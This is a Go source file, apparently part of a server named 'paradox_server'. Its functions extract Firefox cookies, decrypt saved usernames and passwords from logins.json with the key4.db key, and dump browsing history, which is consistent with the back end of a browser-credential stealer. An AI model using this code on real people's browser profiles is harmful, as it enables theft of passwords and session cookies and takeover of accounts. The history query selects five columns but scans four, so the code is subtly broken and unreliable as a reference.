package decode

import (
	"database/sql"
	"errors"
	"fmt"
	"log"
	"paradox_server/crypto"
	"paradox_server/models"
	"paradox_server/static"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
)

func FirefoxCookies(cookiesFile string) []models.Cookie {
	cookiesDB, _ := sql.Open("sqlite3", "file:"+cookiesFile)
	rows, _ := cookiesDB.Query(static.QueryFirefoxCookie)

	var decryptedCookies []models.Cookie
	for rows.Next() {
		var (
			name, value, host, path string
			isSecure, isHttpOnly    int
			creationTime, expiry    int64
		)

		_ = rows.Scan(&name, &value, &host, &path, &creationTime, &expiry, &isSecure, &isHttpOnly)

		decryptedCookies = append(decryptedCookies, models.Cookie{
			KeyName:    name,
			Host:       host,
			Path:       path,
			IsSecure:   IntToBool(isSecure),
			IsHTTPOnly: IntToBool(isHttpOnly),
			CreateDate: TimeStampFormat(creationTime / 1000000),
			ExpireDate: TimeStampFormat(expiry),
			Value:      value,
		})
	}
	return decryptedCookies
}

func FirefoxLogins(folderpath string) ([]*models.LoginData, error) {
	logins, err := crypto.GetLoginsData(filepath.Join(folderpath, "logins.json"))
	if err != nil {
		return nil, errors.New("GetPasswords: error getting logins")
	}

	keyDBPath := filepath.Join(folderpath, "key4.db")
	key, err := crypto.GetDecryptionKey(keyDBPath)
	if err != nil {
		return nil, errors.New("GetPasswords: error getting key")
	}

	var loginsData []*models.LoginData

	for _, login := range logins {
		login, err = crypto.DecryptCredentials(key, login)
		if err != nil {
			return nil, errors.New("GetPasswords: error decrypting")
		}
		loginsData = append(loginsData, &models.LoginData{
			LoginURL: login.URL,
			Username: login.Username,
			Password: login.Password,
		})
	}
	return loginsData, nil
}

func FirefoxHistory(placesFile string) []models.HistoryEntry {
	var history []models.HistoryEntry

	fmt.Println("Db path: ", placesFile)
	db, err := sql.Open("sqlite3", placesFile)
	if err != nil {
		fmt.Println("Error opening db: ", err)
		return nil
	}
	defer db.Close()

	rows, err := db.Query("SELECT id, url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC")
	if err != nil {
		fmt.Println("Error querying db: ", err)
		return nil
	}
	defer rows.Close()

	for rows.Next() {
		var row models.HistoryEntry
		err = rows.Scan(&row.URL, &row.Title, &row.VisitCount, &row.LastVisit)
		if err != nil {
			return nil
		}
		history = append(history, row)
	}

	err = rows.Err()
	if err != nil {
		return nil
	}

	return history
}

func FirefoxFormHistory(formHistoryFile string) []models.WebDataEntry {

	log.Printf("Processing form history from %s - Processing NOT YET IMPLEMENTED", formHistoryFile)

	return nil
}
